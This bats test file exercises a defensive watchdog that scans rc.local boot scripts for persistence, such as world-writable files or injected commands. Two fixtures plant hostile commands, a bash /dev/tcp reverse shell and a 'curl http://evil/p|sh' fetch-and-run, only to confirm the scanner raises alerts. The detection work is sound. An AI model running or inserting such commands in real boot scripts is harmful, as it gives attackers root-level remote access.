#!/usr/bin/env bats
# L2 bats functional tests for the boot-script-watchdog scan script.
#
# The SysV-style boot scripts (/etc/rc.local, /etc/init.d/*, the rc?.d
# symlink farm) run AS ROOT at boot — a classic persistence surface (T1037 /
# T1546). A boot script that is world-writable / non-root-owned, or contains
# a command-injection pattern, is alert.
#
# Run with: bats packaging/test/L2-boot-script-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/systemd/boot-script-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    RCFILE="${TMP}/rc.local"
}

teardown() { rm -rf "${TMP}"; }

# INITD / RCDIRS pointed at nonexistent paths so the test is isolated to
# the rc.local surface.
run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_BOOTSCRIPT_PROFILE="${PROFILE:-report}" \
    SELFDEF_BOOTSCRIPT_BASELINE="${BASELINE}" \
    SELFDEF_BOOTSCRIPT_RCLOCAL="${RCLOCAL_V:-$RCFILE}" \
    SELFDEF_BOOTSCRIPT_INITD="${TMP}/no-initd" \
    SELFDEF_BOOTSCRIPT_RCDIRS="${TMP}/no-rcdir" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

seed_benign() {
    printf '#!/bin/sh\n# rc.local\nexit 0\n' > "${RCFILE}"
}

@test "no boot scripts → ok / no_boot_scripts" {
    RCLOCAL_V="${TMP}/nonexistent" run_wd
    cap | grep -q '"event":"no_boot_scripts"'
    cap | grep -q '"severity":"ok"'
}

@test "benign rc.local, first run → ok / baseline_initial" {
    seed_benign
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged rc.local on second run → ok / boot_script_intact" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"boot_script_intact"'
    cap | grep -q '"severity":"ok"'
}

@test "an injection pattern in rc.local → alert / boot_script_suspicious" {
    seed_benign
    run_wd
    printf '#!/bin/sh\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n' > "${RCFILE}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"boot_script_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "a world-writable rc.local → alert" {
    seed_benign
    run_wd
    chmod 0666 "${RCFILE}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a benign rc.local change → warn / boot_script_changed" {
    seed_benign
    run_wd
    printf '#!/bin/sh\n# rc.local updated\n/usr/local/bin/warm-cache\nexit 0\n' > "${RCFILE}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"event":"boot_script_changed"'
    cap | grep -q '"severity":"warn"'
}

@test "a benign root-owned rc.local is NOT flagged" {
    seed_benign
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    seed_benign
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "enforce profile exits non-zero on a suspicious rc.local" {
    seed_benign
    run_wd
    printf '#!/bin/sh\ncurl http://evil/p|sh\n' > "${RCFILE}"
    : > "${SELFDEF_TEST_LOGCAP}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}
